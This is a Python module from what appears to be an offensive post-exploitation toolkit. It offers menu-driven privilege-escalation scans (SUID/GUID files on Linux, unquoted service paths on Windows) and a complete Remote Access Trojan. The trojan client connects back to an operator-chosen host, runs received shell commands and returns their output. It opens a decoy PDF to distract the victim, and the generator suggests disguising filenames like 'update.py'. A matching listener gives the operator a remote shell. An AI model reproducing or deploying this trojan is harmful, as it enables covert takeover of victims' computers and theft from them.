# core/post_exploit.py
import os
import subprocess
import platform
import socket
import base64
import threading
import time
from utils.reporter import write_html_section

# --- Privilege Escalation Checker Functions ---
def find_suid_guid_files():
    print("\n[üêß Linux SUID/GUID File Scanner]")
    if platform.system() != "Linux":
        print("[‚ö†Ô∏è] This check is for Linux systems only.")
        input("\nPress Enter to return...")
        return
    print("[üîç] Searching for SUID/GUID files... (This may take a moment)")
    try:
        command = "find / -type f \\( -perm -4000 -o -perm -2000 \\) -ls 2>/dev/null"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout.strip()
        if not output:
            print("\n[‚úîÔ∏è] No SUID/GUID files found.")
        else:
            print("\n[üö®] Found potentially interesting SUID/GUID files:")
            print("-" * 50)
            print(output)
            print("-" * 50)
            write_html_section("Linux SUID/GUID Files", output.splitlines())
            print("\n[üíæ] Results saved to report.html")
    except Exception as e:
        print(f"[‚ùå] An error occurred: {e}")
    input("\nPress Enter to return...")

def find_unquoted_service_paths():
    print("\n[ü™ü Windows Unquoted Service Path Checker]")
    if platform.system() != "Windows":
        print("[‚ö†Ô∏è] This check is for Windows systems only.")
        input("\nPress Enter to return...")
        return
    print("[üîç] Searching for unquoted service paths...")
    try:
        command = 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\system32\\\\" | findstr /i /v """'
        result = subprocess.run(command, shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        output = result.stdout.strip()
        if not output:
            print("\n[‚úîÔ∏è] No unquoted service paths found.")
        else:
            print("\n[üö®] Found unquoted service paths:")
            header_cmd = 'wmic service get name,displayname,pathname,startmode'
            header_result = subprocess.run(header_cmd, shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            header = header_result.stdout.splitlines()[0]
            print("-" * 70)
            print(header)
            print(output)
            print("-" * 70)
            write_html_section("Windows Unquoted Service Paths", [header] + output.splitlines())
            print("\n[üíæ] Results saved to report.html")
    except Exception as e:
        print(f"[‚ùå] An error occurred: {e}")
    input("\nPress Enter to return...")

def run_privesc_checker():
    while True:
        print("\n[‚ö° Privilege Escalation Checks]")
        print("[1] Linux SUID/GUID File Scanner")
        print("[2] Windows Unquoted Service Path Checker")
        print("[3] Back to Post-Exploitation Menu")
        choice = input("\nSelect an option: ").strip()
        if choice == '1': find_suid_guid_files()
        elif choice == '2': find_unquoted_service_paths()
        elif choice == '3': break
        else: input("Invalid choice. Press Enter...")

# --- Remote Access Trojan (RAT) Functions ---
CLIENT_TEMPLATE = """
import socket, subprocess, os, threading, base64, time
PDF_DATA = "{pdf_data}"
def open_decoy_pdf():
    if not PDF_DATA: return
    try:
        temp_dir = os.environ.get("TEMP", "/tmp")
        pdf_path = os.path.join(temp_dir, "doc.pdf")
        with open(pdf_path, "wb") as f: f.write(base64.b64decode(PDF_DATA))
        if os.name == 'nt': os.startfile(pdf_path)
        elif os.uname().sysname == 'Darwin': subprocess.run(['open', pdf_path])
        else: subprocess.run(['xdg-open', pdf_path])
    except: pass
def connect_to_server():
    LHOST, LPORT = "{lhost}", {lport}
    if PDF_DATA:
        threading.Thread(target=open_decoy_pdf, daemon=True).start()
        time.sleep(2)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((LHOST, LPORT))
            while True:
                cmd = s.recv(1024).decode()
                if cmd.lower() in ['exit', 'quit']: break
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                out, err = proc.communicate()
                s.send(out or err or b"")
            s.close()
            break
        except: time.sleep(10)
if __name__ == "__main__": connect_to_server()
"""

def start_rat_listener():
    print("\n[üëÇ RAT Listener]")
    host = input("Enter listener host (LHOST) [default: 0.0.0.0]: ").strip() or "0.0.0.0"
    port_str = input("Enter listener port (LPORT) [default: 4444]: ").strip() or "4444"
    try:
        port = int(port_str)
        if not (1 <= port <= 65535): raise ValueError
    except ValueError:
        print("[‚ùå] Invalid port number.")
        input("\nPress Enter to return...")
        return
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((host, port))
        server.listen(1)
        print(f"\n[+] Listening on {host}:{port}...")
        client, addr = server.accept()
        print(f"[+] Connection received from {addr[0]}:{addr[1]}")
        while True:
            command = input(f"Shell@{addr[0]}> ").strip()
            if command.lower() in ['exit', 'quit']:
                client.send(command.encode())
                break
            client.send(command.encode())
            response = client.recv(4096).decode(errors='ignore')
            print(response)
    except Exception as e:
        print(f"[‚ùå] An error occurred: {e}")
    finally:
        if 'client' in locals(): client.close()
        if 'server' in locals(): server.close()
        print("\n[üîå] Connection closed.")
        input("Press Enter to return...")

def generate_rat_client():
    print("\n[üîß RAT Client Generator]")
    lhost = input("Enter LHOST for the client to connect to: ").strip()
    lport_str = input("Enter LPORT for the client to connect to: ").strip()
    if not lhost or not lport_str:
        print("[‚ùå] LHOST and LPORT are required.")
        input("\nPress Enter to return...")
        return
    output_file = input("Enter output filename [e.g., update.py]: ").strip() or "rat_client.py"
    if not output_file.endswith(".py"): output_file += ".py"
    decoy_pdf = input("Enter full path to a decoy PDF (optional): ").strip()
    pdf_data_b64 = ""
    if decoy_pdf:
        try:
            with open(decoy_pdf, "rb") as f:
                pdf_data_b64 = base64.b64encode(f.read()).decode('utf-8')
            print(f"[+] Successfully encoded decoy PDF.")
        except Exception as e:
            print(f"[‚ùå] Failed to process decoy PDF: {e}")
            input("\nPress Enter to return...")
            return
    client_code = CLIENT_TEMPLATE.format(lhost=lhost, lport=lport_str, pdf_data=pdf_data_b64)
    try:
        if not os.path.exists('output'): os.makedirs('output')
        client_path = os.path.join('output', output_file)
        with open(client_path, 'w') as f: f.write(client_code)
        print(f"\n[‚úîÔ∏è] Client script generated successfully at: {client_path}")
    except Exception as e:
        print(f"\n[‚ùå] Failed to write client file: {e}")
    input("\nPress Enter to return...")

def run_rat_controller():
    while True:
        print("\n[üî• Remote Access Trojan (RAT) Controller]")
        print("[1] Start RAT Listener (Server)")
        print("[2] Generate RAT Client")
        print("[3] Back to Post-Exploitation Menu")
        choice = input("\nSelect an option: ").strip()
        if choice == '1': start_rat_listener()
        elif choice == '2': generate_rat_client()
        elif choice == '3': break
        else: input("Invalid choice. Press Enter...")

# --- Main Entry Point for Post-Exploitation ---
def run():
    while True:
        print("\n[üí• Post-Exploitation]")
        print("[1] Privilege Escalation Checker")
        print("[2] Remote Access Trojan (RAT)")
        print("[3] Back to Main Menu")
        choice = input("\nSelect an option: ").strip()
        if choice == '1':
            run_privesc_checker()
        elif choice == '2':
            run_rat_controller()
        elif choice == '3':
            break
        else:
            input("Invalid choice. Press Enter to try again.")